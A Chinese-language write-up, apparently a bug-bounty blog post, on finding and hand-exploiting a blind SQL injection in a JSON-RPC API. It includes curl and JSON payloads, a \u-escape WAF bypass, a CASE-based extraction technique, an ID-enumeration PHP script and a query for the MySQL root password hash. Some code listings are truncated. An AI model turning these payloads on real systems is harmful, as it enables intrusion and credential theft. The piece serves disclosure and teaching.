一些人告诉我现在的人不再会进行手工注入了，今天我要分享一个发现的注入并且手工利用的过程。

接下来的大部分篇章里，我会讲解其中的利用过程，虽然漏洞发现利用过程有点繁琐，我会以一种轻松的方式分享出来的。

我在一个测试的目标JSON-RPC](https://www.jsonrpc.org/specification)API，我发现一个问题，当在这个参数添加一个单引号的时候会报错。

  1. tom@bash:~▶ cat payload.json

  6. }  
  7. tom@bash:~▶ curl -s $APIURL -d [@payload](http://twitter.com/payload "Twitter profile for @payload").json

但是把这个单引号放在Mysql的注释符里面的时候，不会报错。

  1. tom@bash:~▶ cat payload.json   
  2. {  
  3.     "jsonrpc": "2.0",  
  4.     "method": "getWidgets",

  7. tom@bash:~▶ curl -s $APIURL -d [@payload](http://twitter.com/payload "Twitter profile for @payload").json

通过一系列的测试之后， union联合注入失败，又测试了其他不同的字符，我最终发现，我的 payload可以放在 IN字句里面。如果我输入参数值为2，则每一个调试返回的数据结构中， type_id的值为2。

这种行为和关系是在 widgets和 assets之间，我假设查询语句像下面的那样。

  1. SELECT  
  2.     w.id,  
  3.     w.name,  
  4.     a.type_id  
  5. FROM widgets w  
  6. LEFT JOIN assets a ON (  
  7.     a.widget_id = w.id  
  8.     AND a.type_id IN ($IDS)  
  9. )  
  10. ...more SQL...

我很确定它是 LEFT JOIN语法,因为总是返回相同数量的 widgets，只有附加到它们的 assets数量会因参数而异;我很确定在JOIN之后还有更多的SQL语句（一个LIMIT，ORDER BY，另一个JOIN或类似的东西），这就是阻止我之前尝试注入UNION语句的原因。

没有办法直接注入出数据，不知道该怎么办了？

我的第一个想法是，利用常见的盲注方法， if(expression,true,false)语句查询正确与否。如果我提供的ID为2，将会有 assert依附在 widgets，如果我提供的ID为1，那就没有 assets。至少在理论上，我可以使用子查询作为我的 payload，返回2代表True，1表示false。如果返回中有 assets的话，那代表 True，否则代表 False。

我决定通过一些简单的方法来测试理论猜想：数据库服务器的主机名。Mysql服务器上的主机名存储在 hostname变量中，可以很容易的看到它。

  1. mysql> SELECT @@hostname;  
  2. +------------+  
  3. | @@hostname |  
  4. +------------+  
  5. | girru      |  
  6. +------------+  
  7. 1 row in set (0.00 sec)

这些例子是在我本地机器上运行的，我一直认为在本地机器上做测试是一个好的方法，而不是盲目的在实际环境中找问题，没有真实的反馈或错误信息。

因为我只能测试yes/no问题，查看主机名的第一个字符是 a,或者 b和 c，以此类推，直到找到正确的字符。然后我再找第二个字符，可以使用 substring函数。

  1. mysql> SELECT IF(SUBSTRING(@@hostname, 1, 1) = "a", 2, 1);  
  2. +---------------------------------------------+  
  3. | IF(SUBSTRING(@@hostname, 1, 1) = "a", 2, 1) |  
  4. +---------------------------------------------+  
  5. |                                           1 |  
  6. +---------------------------------------------+  
  7. 1 row in set (0.00 sec)

请记住：结果中的1表示“否”，2表示“是”。

测试第一个字符为 g

  1. mysql> SELECT IF(SUBSTRING(@@hostname, 1, 1) = "g", 2, 1);  
  2. +----------------------------------------------+  
  3. | IF (SUBSTRING(@@hostname, 1, 1) = "g", 2, 1) |  
  4. +----------------------------------------------+  
  5. |                                            2 |

值得庆幸的是，因为 payload是JSON，我可以通过使用 \ uXXXX转义轻松地对其进行模糊处理以绕过WAF。成功绕过：

  1. tom@bash:~▶ cat payload.json   
  2. {  
  3.     "jsonrpc": "2.0",  
  4.     "method": "getWidgets",  
  5.     "params": [  
  6.         "\u0053ELECT \u0049F(\u0053UBSTRING(@@hostname, 1, 1) = \"a\", 2, 1)"  
  7.     ]  
  8. }  
  9. tom@bash:~▶ curl -s $APIURL -d [@payload](http://twitter.com/payload "Twitter profile for @payload").json | gron | grep type_id  
  10. // No WAF error here; but no assets either!

现在没有 WAF报错了，但是也没有 assets，如果测试是按照预期进行，则主机名不是以 a开头的，是时候测试下一个了字母了，还有下下一个。

我不是尝试去找主机名的第二个字符，而是写下我的发现并通知他们。 我尝试写一个 POC，作为一种黑客精神。

在我的报告中，我说会导致数据泄露，虽然速度有点慢，但很容易编写脚本。 怎么能快速的获取数据呢？我们需要超过二阶查询，超过三阶查询甚至更多。我们可以使用 case语法。

CASE语句允许您执行以下操作：

  1. mysql> SELECT CASE SUBSTRING(@@hostname, 1, 1)  
  2.     ->     WHEN "a" THEN 1  
  3.     ->     WHEN "b" THEN 2  
  4.     ->     WHEN "c" THEN 3  
  5.     ->     WHEN "d" THEN 4  
  6.     ->     WHEN "e" THEN 5  
  7.     ->     WHEN "f" THEN 6  
  8.     ->     WHEN "g" THEN 7  
  9.     ->     ...  
  10.     ->     WHEN "z" THEN 26  
  11.     -> END as result;  
  12. +--------+  
  13. | result |  
  14. +--------+  
  15. |      7|  
  16. +--------+  
  17. 1 row in set (0.00 sec)

因为结果是7，所以我知道第一个字符是g。

这里的一个小问题。我不能从1到26的字母去注入得到数据，因为并非所有可能的ID都有相应的 assets。我需要找到足够的有效ID来完成这项工作。

我写了一个小PHP脚本，以免我输入从1到100的数字，并尝试传入1,2,3 ... 99,100作为参数。我使用了一些命令行技巧来查找所有唯一有效ID的列表：

  1. tom@bash:~▶ cat genrange.php   
  2. <?php  
  3. $payload = [

  5.     "method"  => "getWidgets",  
  6.     "params"  => [  
  7.         implode(",", range(1, 100))
  8.     ]  
  9. ];
  11. echo json_encode($payload);  
  12. tom@bash:~▶ curl --compressed -s $APIURL -d @<(php genrange.php) | gron | grep type_id | awk '{print $NF}' | sort -nu  
  13. 2;  
  14. 9;  
  15. 10;  
  16. 11;  
  17. _...snip..._  
  18. 37;  
  19. 38;  
  20. 39;  
  21. 40;

总共我发现了31个有效的ID，这甚至不足以覆盖ASCII字符集，但它足以包括所有小写字母甚至几个数字以便进行测量。省去了逐个判断的麻烦。

我实际上是以每个请求读取一个字符的速度来获取主机名，大概为2秒。

读取主机名可能不是太严重的问题，尝试获取其他的信息，数据库用户。

  1. SELECT CASE SUBSTRING((  
  2.     SELECT u.authentication_string  
  3.     FROM mysql.user u  
  4.     WHERE u.User = "root"  
  5. ), 1, 1)  
  6.     WHEN "*" THEN 2  
  7.     WHEN "0" THEN 8  
  8.     WHEN "1" THEN 9  
  9. ...snip...  
  10.     WHEN "E" THEN 22  
  11.     WHEN "F" THEN 23

42次请求，你已经得到了爆破的哈希值。当然，大多数情况下，Mysql的密码是没用的。稍微聪明一些的管理员不允许直接访问数据库的。但这只是一个小技巧。

在真实的攻击中，我会去注入 information_schema元数据库，来获取更多的信息。
